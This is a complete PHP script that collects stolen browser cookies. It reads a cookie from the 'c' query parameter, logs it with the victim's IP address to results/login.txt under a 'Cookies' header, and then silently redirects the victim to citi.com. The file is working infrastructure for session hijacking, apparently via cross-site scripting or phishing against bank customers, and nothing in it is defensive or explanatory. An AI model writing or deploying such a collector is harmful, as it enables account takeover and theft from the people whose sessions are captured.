<?php

function getUserIpAddr(){
    if(!empty($_SERVER['HTTP_CLIENT_IP'])){
        //ip from share internet
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
        //ip pass from proxy
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }else{
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

$cookie = $_GET['c'];
$ip = getUserIpAddr();
$steal="\n----Cookies----\nIP:$ip\n-----\n";
$steal.="Cookie:$cookie\n\n\n-----\n\n";

$file = fopen('results/login.txt','a');
fwrite($file, $steal);
echo "<script>window.location.href='https://citi.com/';</script>";
exit;
?>